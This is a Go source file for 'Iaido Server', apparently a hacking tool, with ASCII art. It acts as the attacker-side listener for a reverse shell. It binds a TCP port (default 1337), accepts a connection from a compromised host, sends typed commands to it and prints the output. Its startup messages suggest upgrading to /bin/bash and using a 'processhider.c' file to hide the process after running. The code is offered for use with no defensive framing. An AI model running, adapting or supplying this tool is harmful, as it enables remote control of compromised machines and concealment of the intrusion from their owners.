package main

//Iaido Server :]

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"github.com/fatih/color"
	"time"
)

func asciiArt() {
	color.Cyan(`	                                                                                                                            
                                               .                      
                            %%%%%%%%%%%%%&&&@@@.         .            
   *  .            ,,,,,*%%%%%%%%&&&&&&&&@@@@@@@@@@,,,,,,       .     
    (  .           .%%%(#%%%%&&&&&@@@@@@@@@@@@@@@@@@@%&*.@@@@@&%(     
  .  /               .(#%&@@&/,,,,*(((((/,,,,,#@@@@@@@  @@@@&&%#      
   .  *           .  (%(.,,,,,,*****/#(,,.,,,*******(@@@@@@@&%%     . 
       *            ..,      %&, ,***(*,,*  %&    ..(*,@@@@@@@&&&&&* .
        ,*          #%,*          .,,(.         ....(%&%@@@@@&&&&&&   
         .(         %%%%%%%%%%%%%%%%%&&@@@@@@@@@@@@@@@&/            . 
           (  .     %&&&&%%%%%%%%%&&&&&&@@@@@@@@@@@@@@@.              
            (  . .  %%%%%%%%&&@@@@@@@@@@@@@@@@&&&&&&&&&.              
             /     %&%%%&&%%%%%%&&&&@@&%%%&&&@@&&&@@@@@@@             
           .  , ,%&&%%%%%%%%&&@@%%%%%%&&&&@@@@@@@@@@@@@@@@@           
               %@@@@&%%%%%%%%%&&&&&&@@@@@@@@@@@@@@@@@@@@@@@#          
               *&@&@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@%@/**         
                 @@#&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@      .       
                   (&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@&, .           
                   (%%%%%%%%%&&&&&&&&&&&&@@@@@@@@@@@@@@@              
                 .  %%%%%%%%%%%%%&&&&&&&&&&&@@@@@@@@@@@@              
                    #%%%%%%%%%%&&&&&&&&&&@@@@@@@@@@@@@@  .            
                  .  #%&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@&               
                      /#&&&&&&&&&&@@@@@@@@@@@@@@@@@&%*  .             
                     .   &@%%&&@@@@@@@@@@@@@@@&&@@.                   
                           &&@@             (@&%#                     
                         .                .                           
                                                                      github.com/T0k1To
	`)
}

//Simple suggestions to you use
func Warning() {
	fmt.Printf("[*] Optional recommendations: Use /bin/bash to improve your shell \n")
	time.Sleep(1 * time.Second)
	fmt.Printf("[+] If you want hide your process, use the file called 'processhider.c' after execute this code!\n[+] Loading...\n")
	time.Sleep(2 * time.Second)
}

func main() {

	//Call the Warning funcion
	asciiArt()
	Warning()

	//Flags
	portPtr := flag.Int("p", 1337, "[+] Listening port")
	listenPtr := flag.Bool("l", false, "[+] Server mode")

	flag.Parse()
	log.Printf("portPtr %d, listenPtr %t", *portPtr, *listenPtr)
	
	//Start listenign on all on portPtr
	conn, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *portPtr))
	if err != nil {
		log.Fatal("[-] Error, cannot bind to port")
	}

	//Accept incoming connection
	listener, err := conn.Accept()
	if err != nil {
		log.Fatal("[-] Error, cannot accept connection")
	}

	//Output with connections address and port
	time.Sleep(2 * time.Second)
	log.Printf("[+] Connection from: %s", listener.RemoteAddr().String())
	shellPipeReader, shellPipeWriter := io.Pipe()
	for {
		//Copy data from listener(client, shell provider) to stdout gorutine to don't block code execution
		go io.Copy(shellPipeWriter, listener)
		go io.Copy(os.Stdout, shellPipeReader)
		//Get user input aka commands to execute
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal("[-] Cannot send message")
		}

		//Send commands to listener(client, shell provider)
		listener.Write([]byte(text))
	}

}
